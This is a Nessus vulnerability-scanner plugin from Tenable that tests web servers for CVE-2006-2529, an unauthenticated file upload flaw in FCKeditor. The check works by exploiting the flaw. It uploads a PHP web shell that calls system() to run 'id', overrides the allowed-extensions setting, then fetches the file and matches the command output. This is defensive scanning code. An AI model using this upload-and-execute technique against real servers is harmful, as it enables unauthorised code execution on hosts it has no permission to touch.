#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
an arbitrary file upload vulnerability. 

Description :

The version of FCKeditor installed on the remote host allows an
unauthenticated attacker to upload arbitrary files containing, say,
PHP code, and then to execute them subject to the privileges of the
web server user id. 

See also :

http://www.fckeditor.net/whatsnew/default.html

Solution :

Either edit 'editor/filemanager/upload/php/config.php' to disable file
uploads or upgrade to FCKeditor 2.3beta or later. 

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description)
{
  script_id(21573);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-2529");
  script_bugtraq_id(18029);
  script_xref(name:"OSVDB", value:"25631");

  script_name(english:"FCKeditor Arbitrary File Upload Vulnerability");
  script_summary(english:"Tries to use upload a file with PHP code using FCKeditor");
 
  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/fckeditor", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the affected script exists.
  url = string(dir, "/editor/filemanager/upload/php/upload.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does and is not disabled...
  if ("OnUploadCompleted" >< res && "file uploader is disabled" >!< res)
  {
    # Try to upload a file that will execute a command.
    cmd = "id";
    fname = string(SCRIPT_NAME, "-", unixtime(), ".php");
    type = string("nessus-", unixtime());

    boundary = "nessus";
    req = string(
      "POST ",  url, "?Type=", type, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="NewFile"; filename="', fname, '"', "\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      '# nb: only run cmd if the request is from the nessusd host.\r\n',
      '<? if ($REMOTE_ADDR == "', this_host(), '") { system(', cmd, "); } ?>\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="Config[AllowedExtensions][', type, '][0]"', "\r\n",
      "\r\n",
      "php\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    pat = string('OnUploadCompleted\\(0,"([^"]+/', fname, ')');
    url2 = NULL;
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        url2 = eregmatch(pattern:pat, string:match);
        if (!isnull(url2)) {
          url2 = url2[1];
          break;
        }
      }
    }
    if (isnull(url2)) exit(0);

    # Now try to execute the script.
    req = http_get(item:url2, port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);
    
    # There's a problem if...
    if (
      # the output looks like it's from id or...
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
      # PHP's disable_functions prevents running system().
      egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
    )
    {
      if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          res
        );
      else report = desc;

      security_note(port:port, data:report);
      exit(0);
    }
  }
}
